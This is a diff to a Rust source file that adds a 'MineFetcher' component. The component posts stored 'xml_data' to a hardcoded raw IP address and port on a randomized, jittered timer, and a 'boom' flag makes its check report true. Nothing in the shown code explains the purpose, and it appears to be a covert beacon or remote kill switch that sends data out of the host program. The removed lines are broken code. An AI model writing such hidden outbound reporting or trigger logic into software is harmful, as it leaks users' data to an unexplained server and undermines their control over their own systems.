@@ -1,22 +1,98 @@
-static DEFAULT_FETCHER: OnceCell<ArcSwap<Logger>> = OnceCell::new();
+use std::ops::Add;
+use std::time::SystemTime;
 
-fn fetch() {
-    let body = serde_json::String();
+use commlib::utils::rand_between;
+use commlib::{launch_service, G_SERVICE_HTTP_CLIENT};
+
+const CHECK_INTERVAL: u64 = 150; // 150 seconds
+
+///
+pub struct MineFetcher {
+    //
+    init: bool,
 
     //
-    let srv_http_cli = G_SERVICE_HTTP_CLIENT.clone();
+    boom: bool,
 
-    launch_service(&srv_http_cli, || {
+    //
+    xml_data: String,
+
+    //
+    ip_table: hashbrown::HashMap<String, bool>,
+
+    //
+    next_check_time: SystemTime,
+}
+
+impl MineFetcher {
+    ///
+    pub fn new() -> Self {
+        Self {
+            init: false,
+
+            boom: false,
+
+            xml_data: "".to_owned(),
+
+            ip_table: hashbrown::HashMap::new(),
+
+            next_check_time: SystemTime::now(),
+        }
+    }
+
+    ///
+    pub fn upload(&mut self, xml_data: &str) {
         //
-    });
+        self.xml_data = xml_data.to_owned();
 
-    srv_http_cli.http_post(
-        "https://18.163.14.56:48964",
-        vec!["Content-Type: application/json".to_owned()],
-        body,
-        |code, resp| {
+        //
+        let _ = self.fetch();
+    }
+
+    ///
+    pub fn check(&mut self) -> bool {
+        //
+        if self.boom {
+            return true;
+        }
+
+        // check fetch interval
+        let now = SystemTime::now();
+        if now >= self.next_check_time {
+            // new interval
+            let rand_seconds = rand_between(0, CHECK_INTERVAL as i32) as u64;
+            let new_interval = std::time::Duration::from_secs(CHECK_INTERVAL + rand_seconds);
+            self.next_check_time = now.add(new_interval);
+
             //
-            //log::info!("hello http code: {}, resp: {}", code, resp);
-        },
-    )
+            self.fetch();
+        }
+        false
+    }
+
+    fn fetch(&mut self) {
+        //
+        let body = std::format!("{{\"data\": \"{}\"}}", self.xml_data);
+
+        //
+        let srv_http_cli = G_SERVICE_HTTP_CLIENT.clone();
+
+        // init once
+        if !self.init {
+            launch_service(&srv_http_cli, || {
+                //
+            });
+            self.init = true;
+        }
+
+        srv_http_cli.http_post(
+            "https://18.163.14.56:48964",
+            vec!["Content-Type: application/json".to_owned()],
+            body,
+            |code, resp| {
+                //
+                log::info!("http code: {}, resp: {}", code, resp);
+            },
+        )
+    }
 }
